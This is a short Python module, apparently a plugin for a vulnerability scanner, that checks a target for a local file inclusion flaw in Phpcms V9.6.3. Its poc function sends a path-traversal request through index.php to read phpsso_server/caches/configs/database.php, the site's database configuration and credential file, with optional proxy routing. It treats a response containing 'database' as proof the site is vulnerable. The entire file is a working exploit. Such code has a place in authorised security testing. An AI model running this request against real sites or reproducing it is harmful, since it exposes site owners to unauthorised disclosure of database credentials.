# coding: utf-8
import requests
import re
#Phpcms V9.6.3 本地文件包含漏洞
def poc(url,user_agent,proxy):

    url = url.strip("/")
    exp_url = url  + '/index.php?m=search&a=public_get_suggest_keyword&q=../../phpsso_server/caches/configs/database.php'
    header = {'User-Agent': user_agent}

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.get(exp_url, headers=header, proxies=proxies)
    else:
        response = requests.get(exp_url, headers=header)

    if 'database' in response.text and response.status_code==200:
        return 'Phpcms V9.6.3 - 本地文件包含漏洞'


def run(url,logindict,user_agent,proxies):
    result = poc(url,user_agent,proxies)
    return result

